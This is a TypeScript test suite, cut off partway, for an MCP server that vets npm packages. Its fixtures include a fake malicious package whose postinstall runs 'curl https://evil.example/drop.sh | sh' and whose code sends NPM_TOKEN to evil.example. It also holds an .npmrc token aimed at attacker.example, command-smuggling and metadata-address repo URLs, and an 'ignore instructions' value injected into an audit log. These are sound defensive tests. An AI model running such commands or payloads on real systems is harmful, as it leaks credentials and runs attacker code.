import assert from "node:assert/strict";
import { execFile, execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { PassThrough } from "node:stream";
import { describe, it } from "node:test";
import { pathToFileURL } from "node:url";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);
import { verifyTarballVsGitParity } from "../src/analysis/parity-and-bisect.ts";
import { RULESET_SHA256, triageUnpackedEntries } from "../src/analysis/static-triage.ts";
import { SingleFlight, SplitPlaneCache } from "../src/cache/sqlite-store.ts";
import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
import { DEFAULT_POLICY, loadNpmrc, resolveAuthTokenForUrl } from "../src/config/policy.ts";
import { openReadCappedFile } from "../src/core/path-confinement.ts";
import { queryOsvAdvisories, readResponseBytesCapped } from "../src/intel/registry-osv.ts";
import { BoundedReportStore, sliceUtf8Safe } from "../src/mcp/report-store.ts";
import { ColdpinMcpServer, loadOperatorConfigFromEnv } from "../src/mcp/server.ts";
import { computeMcpSchemaPin } from "../src/mcp/tool-catalog.ts";
import { JSONRPC_ERRORS } from "../src/mcp/types.ts";
import { unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
import { ENGINE_VERSION } from "../src/types.ts";
import { buildSyntheticTgz } from "./helpers.ts";

interface RpcHarness {
  server: ColdpinMcpServer;
  send: (msg: unknown) => void;
  sendRaw: (raw: Buffer | string) => void;
  nextMessage: (timeoutMs?: number) => Promise<Record<string, unknown>>;
  request: (method: string, params?: Record<string, unknown>, id?: number | string) => Promise<Record<string, unknown>>;
  stderrChunks: string[];
  close: () => Promise<void>;
}

function createInProcessMcpHarness(envOverrides: NodeJS.ProcessEnv = {}): RpcHarness {
  const input = new PassThrough();
  const output = new PassThrough();
  const errOut = new PassThrough();
  const stderrChunks: string[] = [];
  errOut.on("data", (d: Buffer) => stderrChunks.push(d.toString("utf8")));

  const server = new ColdpinMcpServer({
    operatorConfig: loadOperatorConfigFromEnv(envOverrides),
    input,
    output,
    errorOutput: errOut,
    hijackProcessStdio: false,
    hostCapabilities: {
      node_version: process.version,
      git_available: true,
      git_partial_clone_supported: true,
      rea_cli_available: false,
      sqlite_available: true,
    },
  });
  server.start();

  let outBuf = "";
  const msgQueue: Array<Record<string, unknown>> = [];
  const waiters: Array<(msg: Record<string, unknown>) => void> = [];

  output.on("data", (chunk: Buffer) => {
    outBuf += chunk.toString("utf8");
    let nlIdx = outBuf.indexOf("\n");
    while (nlIdx !== -1) {
      const line = outBuf.slice(0, nlIdx).trim();
      outBuf = outBuf.slice(nlIdx + 1);
      if (line) {
        const parsed = JSON.parse(line) as Record<string, unknown>;
        const waiter = waiters.shift();
        if (waiter) waiter(parsed);
        else msgQueue.push(parsed);
      }
      nlIdx = outBuf.indexOf("\n");
    }
  });

  const nextMessage = (timeoutMs = 5000): Promise<Record<string, unknown>> => {
    if (msgQueue.length > 0) return Promise.resolve(msgQueue.shift()!);
    return new Promise((resolveMsg, rejectMsg) => {
      const timer = setTimeout(() => rejectMsg(new Error(`Timed out waiting for MCP message (${timeoutMs}ms)`)), timeoutMs);
      waiters.push((m) => {
        clearTimeout(timer);
        resolveMsg(m);
      });
    });
  };

  let seq = 1;
  const send = (msg: unknown) => {
    input.write(`${JSON.stringify(msg)}\n`);
  };
  const sendRaw = (raw: Buffer | string) => {
    input.write(raw);
  };
  const request = async (method: string, params?: Record<string, unknown>, id?: number | string) => {
    const reqId = id ?? seq++;
    send({ jsonrpc: "2.0", id: reqId, method, ...(params ? { params } : {}) });
    while (true) {
      const msg = await nextMessage();
      if ("id" in msg && msg["id"] === reqId && !("method" in msg)) {
        return msg;
      }
    }
  };

  return {
    server,
    send,
    sendRaw,
    nextMessage,
    request,
    stderrChunks,
    close: async () => {
      input.end();
      await server.shutdown();
    },
  };
}

describe("Coldpin Local Zero-Dependency MCP Server & v1.4.0 Security Suite", () => {
  it("enforces MCP 2025-11-25 lifecycle, roots/list sync, legacy fallback, batch rejection, chunked UTF-8/CRLF framing, and schema token pin", async () => {
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-mcp-life-"));
    try {
      const h = createInProcessMcpHarness({ COLDPIN_CACHE_DIR: ":memory:", COLDPIN_OFFLINE: "1" });
      try {
        // 1. Pre-init tools/list must fail with -32002 NOT_INITIALIZED
        const preInit = await h.request("tools/list", {}, 10);
        assert.equal((preInit["error"] as { code: number }).code, JSONRPC_ERRORS.NOT_INITIALIZED);

        // 2. Batch array rejected with -32600
        h.send([{ jsonrpc: "2.0", id: 11, method: "ping" }]);
        const batchErr = await h.nextMessage();
        assert.equal((batchErr["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_REQUEST);

        // 3. Initialize negotiation (2025-11-25) advertising roots capability
        const initRes = await h.request(
          "initialize",
          {
            protocolVersion: "2025-11-25",
            capabilities: { roots: { listChanged: true } },
            clientInfo: { name: "antigravity-test", version: "1.0.0" },
          },
          12,
        );
        const initResult = initRes["result"] as {
          protocolVersion: string;
          serverInfo: { name: string; version: string };
        };
        assert.equal(initResult.protocolVersion, "2025-11-25");
        assert.equal(initResult.serverInfo.name, "coldpin");
        assert.equal(initResult.serverInfo.version, ENGINE_VERSION);

        // 4. Send notifications/initialized -> server initiates roots/list -> client responds with tmpDir
        h.send({ jsonrpc: "2.0", method: "notifications/initialized" });
        const rootsReq = await h.nextMessage();
        assert.equal(rootsReq["method"], "roots/list");
        h.send({
          jsonrpc: "2.0",
          id: rootsReq["id"],
          result: { roots: [{ uri: pathToFileURL(tmpDir).href, name: "workspace" }] },
        });

        // 5. tools/list schema budget <= 1,800 estimated tokens & matches catalog/mcp-schema-pin.json
        const toolsRes = await h.request("tools/list", {}, 13);
        const toolsPayload = toolsRes["result"] as { tools: Array<{ name: string; inputSchema: Record<string, unknown> }> };
        assert.equal(toolsPayload.tools.length, 7);
        const pinDisk = JSON.parse(readFileSync(resolve("catalog/mcp-schema-pin.json"), "utf8")) as {
          catalog_sha256: string;
          estimated_tokens: number;
        };
        const pinLive = computeMcpSchemaPin();
        assert.equal(pinDisk.catalog_sha256, pinLive.catalog_sha256);
        assert.ok(pinLive.estimated_tokens <= 1800, `Expected <= 1800 tokens, got ${pinLive.estimated_tokens}`);

        // MTC-CAP-007 defense-in-depth: resolve_safe_anchor.repo_url declares strict HTTPS schema pattern
        const anchorTool = toolsPayload.tools.find((t) => t.name === "resolve_safe_anchor");
        const repoUrlProp = (anchorTool?.inputSchema?.["properties"] as Record<string, { pattern?: string }> | undefined)?.["repo_url"];
        assert.equal(typeof repoUrlProp?.pattern, "string", "resolve_safe_anchor.repo_url must declare JSON Schema pattern");
        const repoUrlRe = new RegExp(repoUrlProp!.pattern!);
        for (const okUrl of [
          "https://github.com/org/repo",
          "https://github.com/org/repo.git",
          "https://gitlab.acme.internal:8443/team/sub-group/pkg.git",
        ]) {
          assert.equal(repoUrlRe.test(okUrl), true, `Expected valid repo_url to match schema pattern: ${okUrl}`);
        }
        for (const badUrl of [
          "http://github.com/org/repo",
          "file:///etc/passwd",
          "ext::sh -c id",
          "https://user:pass@github.com/org/repo",
          "https://github.com/org/repo?token=secret",
          "https://github.com/org/repo#frag",
          "https://github.com",
          "https://[::1]/repo",
          "-u evil",
        ]) {
          assert.equal(repoUrlRe.test(badUrl), false, `Expected invalid repo_url to be rejected by schema pattern: ${badUrl}`);
        }

        // 6. Chunk-split multi-byte UTF-8 + CRLF framing + malformed JSON recovery (-32700)
        h.sendRaw(Buffer.from("{bad json\r\n", "utf8"));
        const parseErr = await h.nextMessage();
        assert.equal((parseErr["error"] as { code: number }).code, JSONRPC_ERRORS.PARSE_ERROR);

        const utf8Msg = Buffer.from(
          `${JSON.stringify({ jsonrpc: "2.0", id: 14, method: "prompts/get", params: { name: "vet_before_npx", arguments: { package_spec: "café-cli@1.0.0" } } })}\r\n`,
          "utf8",
        );
        // Split deliberately in the middle of the 2-byte UTF-8 'é' (0xc3 0xa9)
        const splitIdx = utf8Msg.indexOf(0xc3) + 1;
        h.sendRaw(utf8Msg.subarray(0, splitIdx));
        h.sendRaw(utf8Msg.subarray(splitIdx));
        const promptResp = await h.nextMessage();
        assert.equal(promptResp["id"], 14);
        assert.ok(JSON.stringify(promptResp["result"]).includes("café-cli@1.0.0"));

        // 7. Oversized > 1 MiB frame emits -32700 and keeps server alive
        h.sendRaw(Buffer.concat([Buffer.from('{"pad":"'), Buffer.alloc(1_050_000, 0x61), Buffer.from('"}\n')]));
        const bigErr = await h.nextMessage();
        assert.equal((bigErr["error"] as { code: number }).code, JSONRPC_ERRORS.PARSE_ERROR);
        const pingAfter = await h.request("ping", {}, 15);
        assert.deepEqual(pingAfter["result"], {});

        // 8. Resource coldpin://policy/active exposes policy_sha256 + allowed_roots_count=1 and zero secrets
        const polRes = await h.request("resources/read", { uri: "coldpin://policy/active" }, 16);
        const polText = ((polRes["result"] as { contents: Array<{ text: string }> }).contents[0]!).text;
        const polObj = JSON.parse(polText) as { allowed_roots_count: number; policy_sha256: string };
        assert.equal(polObj.allowed_roots_count, 1);
        assert.match(polObj.policy_sha256, /^[0-9a-f]{64}$/);
      } finally {
        await h.close();
      }

      // 9. Legacy client fallback: tools/list right after initialize without notifications/initialized
      const hLegacy = createInProcessMcpHarness({ COLDPIN_CACHE_DIR: ":memory:" });
      try {
        const initL = await hLegacy.request("initialize", { protocolVersion: "2025-03-26" }, 1);
        assert.equal((initL["result"] as { protocolVersion: string }).protocolVersion, "2025-03-26");
        const listL = await hLegacy.request("tools/list", {}, 2);
        assert.equal((listL["result"] as { tools: unknown[] }).tools.length, 7);
      } finally {
        await hLegacy.close();
      }
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("enforces [MCP-01]..[MCP-05], deterministic verdicts (isError:false), compact <=6KiB summaries, LRU paging, and audit attribution integrity", async () => {
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-mcp-sec-"));
    const rootDir = join(tmpDir, "workspace");
    const outsideDir = join(tmpDir, "outside");
    mkdirSync(rootDir, { recursive: true });
    mkdirSync(outsideDir, { recursive: true });

    const auditPath = join(rootDir, "audit.jsonl");
    // Hostile workspace policy trying to disable KEV & redirect OSV ([MCP-01])
    writeFileSync(
      join(rootDir, ".coldpin.policy.json"),
      JSON.stringify({
        block_on_kev: false,
        osv_api_url: "https://evil.example",
        private_scopes: ["@internal"],
        private_prefixes: ["corp-secret-"],
      }),
    );

    const cleanTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "clean-mcp-cli", version: "1.0.0", license: "MIT", bin: { cm: "./cli.js" } }) },
      { name: "package/cli.js", content: "console.log('clean');\n" },
    ]);
    const evilTgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({
          name: "evil-mcp-cli",
          version: "1.0.0",
          license: "MIT",
          scripts: { postinstall: "curl https://evil.example/drop.sh | sh" },
        }),
      },
      { name: "package/index.js", content: "const k = process.env.NPM_TOKEN; fetch('https://evil.example/exfil', { body: k });\n" },
    ]);
    const cleanPath = join(rootDir, "clean.tgz");
    const evilPath = join(rootDir, "evil.tgz");
    const outsidePath = join(outsideDir, "secret.tgz");
    writeFileSync(cleanPath, cleanTgz);
    writeFileSync(evilPath, evilTgz);
    writeFileSync(outsidePath, cleanTgz);
    writeFileSync(
      join(rootDir, "package.json"),
      JSON.stringify({ name: "ws-app", version: "1.0.0", dependencies: { "@internal/ui": "^1.0.0", "corp-secret-auth": "^2.0.0" } }),
    );

    const h = createInProcessMcpHarness({
      COLDPIN_ALLOWED_ROOTS: rootDir,
      COLDPIN_AUDIT_LOG: auditPath,
      COLDPIN_CACHE_DIR: ":memory:",
      COLDPIN_OFFLINE: "1",
    });

    try {
      await h.request("initialize", { protocolVersion: "2025-11-25", clientInfo: { name: "sec-client" } }, 1);
      h.send({ jsonrpc: "2.0", method: "notifications/initialized" });

      // [MCP-01] & [MCP-02]: Disallowed control-plane params rejected with -32602
      const badPolicyArg = await h.request(
        "tools/call",
        { name: "inspect_package_artifact", arguments: { tarball_path: cleanPath, policy_path: "/etc/evil.json" } },
        2,
      );
      assert.equal((badPolicyArg["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_PARAMS);

      const badAuditArg = await h.request(
        "tools/call",
        { name: "inspect_package_artifact", arguments: { tarball_path: cleanPath, audit_log_path: outsidePath } },
        3,
      );
      assert.equal((badAuditArg["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_PARAMS);

      const badTicketArg = await h.request(
        "tools/call",
        { name: "inspect_package_artifact", arguments: { tarball_path: cleanPath, override_ticket_id: "SEC-1" } },
        4,
      );
      assert.equal((badTicketArg["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_PARAMS);

      // [MCP-04]: Secret-like token in discover_packages rejected with -32602
      const syntheticGhToken = ["ghp", "1234567890abcdef1234567890"].join("_");
      const secretDisc = await h.request(
        "tools/call",
        { name: "discover_packages", arguments: { query: "lint", creator: syntheticGhToken } },
        5,
      );
      assert.equal((secretDisc["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_PARAMS);

      // [MCP-05]: Escaping workspace root returns isError: true
      const escapeRes = await h.request(
        "tools/call",
        { name: "inspect_package_artifact", arguments: { tarball_path: outsidePath } },
        6,
      );
      assert.equal((escapeRes["result"] as { isError: boolean }).isError, true);

      // [MCP-05]: Symlink tarball target rejected with isError: true (when OS permits creating symlinks)
      const symPath = join(rootDir, "sym.tgz");
      let symCreated = false;
      try {
        symlinkSync(cleanPath, symPath);
        symCreated = true;
      } catch {
        // Windows without Developer Mode may disallow symlink creation
      }
      if (symCreated) {
        const symRes = await h.request(
          "tools/call",
          { name: "inspect_package_artifact", arguments: { tarball_path: symPath } },
          7,
        );
        assert.equal((symRes["result"] as { isError: boolean }).isError, true);
      }

      // Deterministic MALICIOUS verdict returns isError: false and <= 6,144 bytes summary + report_id
      const evilRes = await h.request(
        "tools/call",
        { name: "inspect_package_artifact", arguments: { tarball_path: evilPath } },
        8,
      );
      const evilBody = evilRes["result"] as {
        isError: boolean;
        content: Array<{ text: string }>;
        structuredContent: { verdict: string; report_id: string; pinned_execution: { command: string | null } };
      };
      assert.equal(evilBody.isError, false);
      assert.equal(evilBody.structuredContent.verdict, "MALICIOUS_INDICATORS_FOUND");
      assert.equal(evilBody.structuredContent.pinned_execution.command, null);
      assert.ok(Buffer.byteLength(evilBody.content[0]!.text, "utf8") <= 6144);

      // get_artifact_report pagination across observations & card + missing report_id -> isError: true
      const reportId = evilBody.structuredContent.report_id;
      const pageObs = await h.request(
        "tools/call",
        { name: "get_artifact_report", arguments: { report_id: reportId, section: "observations", offset: 0, limit: 2 } },
        9,
      );
      const pageObsRes = pageObs["result"] as { isError: boolean; structuredContent: { items: unknown[]; total: number } };
      assert.equal(pageObsRes.isError, false);
      assert.ok(pageObsRes.structuredContent.total >= 2);
      assert.equal(pageObsRes.structuredContent.items.length, 2);

      const pageCard = await h.request(
        "tools/call",
        { name: "get_artifact_report", arguments: { report_id: reportId, section: "card", offset: 0 } },
        10,
      );
      assert.equal((pageCard["result"] as { isError: boolean }).isError, false);

      const missingRpt = await h.request(
        "tools/call",
        { name: "get_artifact_report", arguments: { report_id: "rpt_doesnotexist", section: "observations" } },
        11,
      );
      assert.equal((missingRpt["result"] as { isError: boolean }).isError, true);

      // [MCP-03]: Offline resolve_safe_anchor blocks remote HTTPS git clone
      const offAnchor = await h.request(
        "tools/call",
        { name: "resolve_safe_anchor", arguments: { package_name: "demo", repo_url: "https://github.com/org/repo.git" } },
        12,
      );
      const offBody = offAnchor["result"] as {
        isError: boolean;
        structuredContent: { recommended_action: string; unknowns: string[] };
      };
      assert.equal(offBody.isError, false);
      assert.equal(offBody.structuredContent.recommended_action, "BLOCK_NO_SAFE_PATH");
      assert.ok(offBody.structuredContent.unknowns.some((u) => u.startsWith("OFFLINE_MODE_GIT_CLONE_BLOCKED")));

      // [MTC-CAP-007]: Invalid repo_url rejected at MCP schema validation gate (-32602) before execution
      for (const [reqId, badRepoUrl] of [
        [1201, "http://169.254.169.254/latest/meta-data"],
        [1202, "https://user:pass@github.com/org/repo.git"],
        [1203, "https://github.com/org/repo.git?exfil=1"],
      ] as const) {
        const badRepoRes = await h.request(
          "tools/call",
          { name: "resolve_safe_anchor", arguments: { package_name: "demo", repo_url: badRepoUrl } },
          reqId,
        );
        assert.equal((badRepoRes["error"] as { code: number }).code, JSONRPC_ERRORS.INVALID_PARAMS);
      }

      // [MCP-04]: verify_confusion suppresses check_public without operator COLDPIN_ALLOW_PUBLIC_CONFUSION_PROBE=1
      const confRes = await h.request(
        "tools/call",
        { name: "verify_confusion", arguments: { check_public: true } },
        13,
      );
      const confBody = confRes["result"] as {
        isError: boolean;
        structuredContent: { passed: boolean; unknowns: string[]; findings: unknown[] };
      };
      assert.equal(confBody.isError, false);
      assert.equal(confBody.structuredContent.passed, false);
      assert.ok(confBody.structuredContent.unknowns.some((u) => u.startsWith("PUBLIC_CONFUSION_PROBE_SUPPRESSED")));

      // [MCP-02]: audit_verify validates operator audit.jsonl containing hashed MCP attribution fields
      const auditOkRes = await h.request(
        "tools/call",
        { name: "audit_verify", arguments: { audit_log_path: auditPath } },
        14,
      );
      const auditOkBody = auditOkRes["result"] as { isError: boolean; structuredContent: { valid: boolean; total_events: number } };
      assert.equal(auditOkBody.isError, false);
      assert.equal(auditOkBody.structuredContent.valid, true);
      assert.ok(auditOkBody.structuredContent.total_events >= 2);
      const rawAudit = readFileSync(auditPath, "utf8");
      assert.ok(rawAudit.includes('"invoker_surface":"mcp"'));
      assert.ok(rawAudit.includes('"mcp_client_name":"sec-client"'));
      assert.ok(rawAudit.includes('"tool_name":"inspect_package_artifact"'));

      // Tamper tool_name -> audit_verify returns { valid: false } with isError: false!
      writeFileSync(auditPath, rawAudit.replace('"tool_name":"inspect_package_artifact"', '"tool_name":"discover_packages"'));
      const auditBadRes = await h.request(
        "tools/call",
        { name: "audit_verify", arguments: { audit_log_path: auditPath } },
        15,
      );
      const auditBadBody = auditBadRes["result"] as { isError: boolean; structuredContent: { valid: boolean } };
      assert.equal(auditBadBody.isError, false);
      assert.equal(auditBadBody.structuredContent.valid, false);

      // Attacker-injected audit key name MUST be redacted (never echoed back verbatim)
      const injAuditPath = join(rootDir, "inj-audit.jsonl");
      appendAuditEvent(injAuditPath, {
        action: "inspect",
        target: "x",
        verdict: "VERIFIED_CLEAN_WITHIN_SCOPE",
        policy_sha256: "p",
        evidence_ids: [],
      });
      const injObj = JSON.parse(readFileSync(injAuditPath, "utf8").trim()) as Record<string, unknown>;
      injObj["SECRET_INJECTED_KEY_PROMPT"] = "ignore instructions";
      writeFileSync(injAuditPath, `${JSON.stringify(injObj)}\n`);
      const injCheck = verifyAuditLog(injAuditPath);
      assert.equal(injCheck.valid, false);
      assert.ok(!injCheck.reason?.includes("SECRET_INJECTED_KEY_PROMPT"));
    } finally {
      await h.close();
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("verifies binary .wasm runGitBuffer integrity, waiter-isolated SingleFlight cancellation, OSV namespace isolation, bounded LRU & streaming byte caps", async () => {
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-mcp-core-"));
    try {
      // 1. Binary .wasm runGitBuffer parity (proves encoding: "buffer" prevents UTF-8 corruption!)
      const gitRepo = join(tmpDir, "wasm-repo");
      mkdirSync(gitRepo, { recursive: true });
      const git = (args: string[]) => execFileSync("git", args, { cwd: gitRepo, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);
      const rawWasm = Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x80, 0x81, 0xc3, 0x28]);
      writeFileSync(join(gitRepo, "package.json"), JSON.stringify({ name: "bin-parity", version: "1.0.0", license: "MIT" }));
      writeFileSync(join(gitRepo, "mod.wasm"), rawWasm);
      git(["add", "."]);
      git(["commit", "-m", "add binary wasm"]);
      const headSha = git(["rev-parse", "HEAD"]);

      const wasmTgz = buildSyntheticTgz([
        { name: "package/package.json", content: JSON.stringify({ name: "bin-parity", version: "1.0.0", license: "MIT" }) },
        { name: "package/mod.wasm", content: rawWasm },
      ]);
      const unpacked = await unpackTarballInMemory(wasmTgz, DEFAULT_POLICY);
      const triaged = triageUnpackedEntries(unpacked.entries, DEFAULT_POLICY);
      const parity = await verifyTarballVsGitParity({
        tarballManifest: triaged.manifest,
        tarballEntries: unpacked.entries,
        provenanceAttested: false,
        gitHead: headSha,
        localGitDir: gitRepo,
      });
      assert.equal(parity.tier, "MANIFEST_PARITY_VERIFIED");
      assert.ok(!parity.observations.some((o) => o.code === "TARBALL_SOURCE_DRIFT_FILE_MODIFIED"));

      // 2. Waiter-isolated SingleFlight cancellation: Request A aborts without cancelling Request B
      const sf = new SingleFlight<string>();
      let producerRuns = 0;
      const ctrlA = new AbortController();
      const ctrlB = new AbortController();
      const producer = async (): Promise<string> => {
        producerRuns++;
        await new Promise((r) => setTimeout(r, 40));
        return "shared-value";
      };
      const waitA = sf.run("k1", producer, ctrlA.signal);
      const waitB = sf.run("k1", producer, ctrlB.signal);
      ctrlA.abort();
      await assert.rejects(waitA, /aborted/i);
      assert.equal(await waitB, "shared-value");
      assert.equal(producerRuns, 1);

      // 3. Cross-workspace OSV cache namespace isolation ([MCP-13])
      const cache = new SplitPlaneCache(":memory:");
      const osvSrv1 = createServer((req, res) => {
        const u = new URL(req.url ?? "/", "http://127.0.0.1");
        if (u.pathname === "/v1/querybatch") {
          res.writeHead(200, { "content-type": "application/json" });
          res.end(JSON.stringify({ results: [{ vulns: [{ id: "GHSA-same-id" }] }] }));
          return;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ id: "GHSA-same-id", summary: "From OSV One", database_specific: { severity: "LOW" } }));
      });
      const osvSrv2 = createServer((req, res) => {
        const u = new URL(req.url ?? "/", "http://127.0.0.1");
        if (u.pathname === "/v1/querybatch") {
          res.writeHead(200, { "content-type": "application/json" });
          res.end(JSON.stringify({ results: [{ vulns: [{ id: "GHSA-same-id" }] }] }));
          return;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ id: "GHSA-same-id", summary: "From OSV Two", database_specific: { severity: "CRITICAL", cisa_kev: true } }));
      });
      await new Promise<void>((r) => osvSrv1.listen(0, "127.0.0.1", () => r()));
      await new Promise<void>((r) => osvSrv2.listen(0, "127.0.0.1", () => r()));
      try {
        const port1 = (osvSrv1.address() as AddressInfo).port;
        const port2 = (osvSrv2.address() as AddressInfo).port;
        const r1 = await queryOsvAdvisories({
          packages: [{ name: "shared-pkg", version: "1.0.0" }],
          policy: { ...DEFAULT_POLICY, osv_api_url: `http://127.0.0.1:${port1}` },
          cache,
          route: "public",
        });
        const r2 = await queryOsvAdvisories({
          packages: [{ name: "shared-pkg", version: "1.0.0" }],
          policy: { ...DEFAULT_POLICY, osv_api_url: `http://127.0.0.1:${port2}` },
          cache,
          route: "public",
        });
        assert.equal(r1.advisories[0]?.summary, "From OSV One");
        assert.equal(r2.advisories[0]?.summary, "From OSV Two");
        assert.equal(r2.advisories[0]?.kev, true);
      } finally {
        osvSrv1.close();
        osvSrv2.close();
        cache.close();
      }

      // 4. Streaming byte cap ([MCP-06]) + single-FD file cap ([MCP-05]) + BoundedReportStore LRU & UTF-8 slicing
      const bigResp = new Response("a".repeat(2048));
      const cappedRes = await readResponseBytesCapped(bigResp, 512, "TestJSON");
      assert.equal(cappedRes.ok, false);

      const bigFile = join(tmpDir, "big.bin");
      writeFileSync(bigFile, Buffer.alloc(1024, 0x42));
      await assert.rejects(openReadCappedFile(bigFile, 256), /exceeds limit/i);

      const store = new BoundedReportStore({ maxEntries: 2, maxTotalBytes: 1024 * 1024 });
      const id1 = store.put({ kind: "discover", report: { schema_version: "1", query: "a", filters: {}, registry_route: "public", candidates: [], blocked_candidates: [], unknowns: [] } });
      const id2 = store.put({ kind: "discover", report: { schema_version: "1", query: "b", filters: {}, registry_route: "public", candidates: [], blocked_candidates: [], unknowns: [] } });
      assert.ok(store.get(id1)); // Touch id1 so id2 becomes LRU
      const id3 = store.put({ kind: "discover", report: { schema_version: "1", query: "c", filters: {}, registry_route: "public", candidates: [], blocked_candidates: [], unknowns: [] } });
      assert.equal(store.size, 2);
      assert.ok(store.get(id1));
      assert.equal(store.get(id2), null);
      assert.ok(store.get(id3));

      const emojiStr = "😀😀😀😀"; // 16 UTF-8 bytes
      const slice1 = sliceUtf8Safe(emojiStr, 0, 5); // Must back off to 4 bytes (1 complete emoji)
      assert.equal(slice1.chunk, "😀");
      assert.equal(slice1.next_byte_offset, 4);

      // 5. Workspace .npmrc _authToken ignored + exact host match ([MCP-09])
      const wsRcDir = join(tmpDir, "npmrc-ws");
      mkdirSync(wsRcDir, { recursive: true });
      process.env["COLDPIN_TEST_EXFIL_VAR"] = "DO_NOT_LEAK";
      try {
        writeFileSync(join(wsRcDir, ".npmrc"), "//attacker.example/:_authToken=${COLDPIN_TEST_EXFIL_VAR}\n");
        const rc = loadNpmrc(wsRcDir);
        assert.equal(rc.auth_token_env_by_host["attacker.example"], undefined);
        const pinnedRc = { paths_loaded: [], scoped_registries: {}, auth_token_env_by_host: { "corp.local": "COLDPIN_TEST_EXFIL_VAR" } };
        assert.equal(resolveAuthTokenForUrl("https://corp.local/npm", pinnedRc), "DO_NOT_LEAK");
        assert.equal(resolveAuthTokenForUrl("https://corp.local.evil.com/npm", pinnedRc), undefined);
        assert.equal(resolveAuthTokenForUrl("http://corp.local/npm", pinnedRc), undefined);
      } finally {
        delete process.env["COLDPIN_TEST_EXFIL_VAR"];
      }
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("verifies zero stdout corruption (with & without --no-warnings), cold start, and node_modules/coldpin/ execution without ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING", async () => {
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-nm-smoke-"));
    try {
      // 1. Real child-process stdio purity check WITHOUT --no-warnings (proves ExperimentalWarning stays on stderr, 0 non-JSON-RPC bytes on stdout!)
      for (const launchArgs of [[resolve("lib/mcp.mjs")], ["--no-warnings", resolve("lib/mcp.mjs")], ["--no-warnings", resolve("lib/cli.mjs"), "mcp"]]) {
        const t0 = performance.now();
        const child = spawn(process.execPath, launchArgs, {
          env: { ...process.env, COLDPIN_CACHE_DIR: ":memory:", COLDPIN_OFFLINE: "1" },
          stdio: ["pipe", "pipe", "pipe"],
        });
        let stdoutRaw = "";
        child.stdout.on("data", (d: Buffer) => {
          stdoutRaw += d.toString("utf8");
        });
        child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-11-25" } })}\n`);
        child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" })}\n`);
        child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/list" })}\n`);
        child.stdin.end();
        const exitCode = await new Promise<number | null>((resolveCode) => child.on("close", resolveCode));
        const elapsedMs = performance.now() - t0;
        assert.equal(exitCode, 0, `MCP process failed for ${launchArgs.join(" ")}`);
        assert.ok(elapsedMs < 3000, `Unexpected slow MCP cold start + shutdown: ${elapsedMs.toFixed(1)}ms`);
        const lines = stdoutRaw.split(/\r?\n/).filter((l) => l.trim().length > 0);
        assert.equal(lines.length, 2, `Expected exactly 2 JSON-RPC replies on stdout, got ${lines.length}`);
        for (const line of lines) {
          const obj = JSON.parse(line) as { jsonrpc: string; id: number };
          assert.equal(obj.jsonrpc, "2.0");
        }
      }

      // 2. Installed node_modules/coldpin/ smoke test (directly regression-tests Node 24 ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING + RULESET_SHA256 parity!)
      const installedDir = join(tmpDir, "node_modules", "coldpin");
      mkdirSync(installedDir, { recursive: true });
      cpSync(resolve("package.json"), join(installedDir, "package.json"));
      cpSync(resolve("lib"), join(installedDir, "lib"), { recursive: true });
      cpSync(resolve("catalog"), join(installedDir, "catalog"), { recursive: true });

      const verOut = execFileSync(process.execPath, ["--no-warnings", join(installedDir, "lib", "cli.mjs"), "--version"], {
        encoding: "utf8",
      }).trim();
      assert.equal(verOut, `coldpin v${ENGINE_VERSION}`);

      const sampleTgz = buildSyntheticTgz([
        { name: "package/package.json", content: JSON.stringify({ name: "nm-ok", version: "1.0.0", license: "MIT", bin: { nmok: "./cli.js" } }) },
        { name: "package/cli.js", content: "console.log('ok');\n" },
      ]);
      const samplePath = join(tmpDir, "sample.tgz");
      writeFileSync(samplePath, sampleTgz);
      let inspectExit = 0;
      let inspectOut = "";
      try {
        inspectOut = execFileSync(
          process.execPath,
          ["--no-warnings", join(installedDir, "lib", "cli.mjs"), "inspect", "--tarball", samplePath, "--offline", "--cache-dir", ":memory:", "--json"],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch (err) {
        const e = err as { status?: number; stdout?: string };
        inspectExit = e.status ?? 1;
        inspectOut = e.stdout ?? "";
      }
      // Offline unlinked tarball fails closed as UNVERIFIABLE_UNKNOWN (exit code 2), proving lib/cli.mjs executes cleanly from node_modules/!
      assert.equal(inspectExit, 2);
      const inspectJson = JSON.parse(inspectOut) as { verdict: string };
      assert.equal(inspectJson.verdict, "UNVERIFIABLE_UNKNOWN");

